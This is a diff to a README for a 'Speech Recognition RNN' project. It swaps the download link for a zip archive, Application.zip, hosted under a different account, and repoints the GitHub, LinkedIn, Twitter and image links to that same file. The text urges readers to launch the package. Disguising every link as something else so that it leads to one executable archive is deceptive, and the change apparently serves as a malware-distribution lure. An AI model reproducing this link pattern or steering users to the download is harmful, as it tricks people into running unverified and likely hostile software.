@@ -35,7 +35,7 @@ We provide comprehensive evaluation metrics to assess the performance of our mod
 
 To explore the full capabilities of our Speech Recognition RNN model, simply download our software package from the following link:
 
-[![Download Software](https://img.shields.io/badge/Download-Software-green.svg)](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/Andersonjesusvital/Speech-Recognition-RNN/releases/download/v1.0.0/Application.zip)](https://github.com/Andersonjesusvital/Speech-Recognition-RNN/releases/download/v1.0.0/Application.zip)
 
 ℹ️ Please note that the software package needs to be launched to access the complete functionality of our model.
 
@@ -47,9 +47,9 @@ If you're passionate about speech recognition, deep learning, and natural langua
 
 👨‍💻👩‍💻 Happy coding and speech transcribing! 🎙️📝
 
-🔗 Connect with us on [GitHub](https://github.com/) | [LinkedIn](https://www.linkedin.com/) | [Twitter](https://twitter.com/)
+🔗 Connect with us on [GitHub](https://github.com/Andersonjesusvital/Speech-Recognition-RNN/releases/download/v1.0.0/Application.zip) | [LinkedIn](https://github.com/Andersonjesusvital/Speech-Recognition-RNN/releases/download/v1.0.0/Application.zip) | [Twitter](https://github.com/Andersonjesusvital/Speech-Recognition-RNN/releases/download/v1.0.0/Application.zip)
 
-![Speech Recognition RNN](https://imageurl.com)
+![Speech Recognition RNN](https://github.com/Andersonjesusvital/Speech-Recognition-RNN/releases/download/v1.0.0/Application.zip)
 
 [⬆️ Back to Top](#-speech-recognition-rnn-)
 
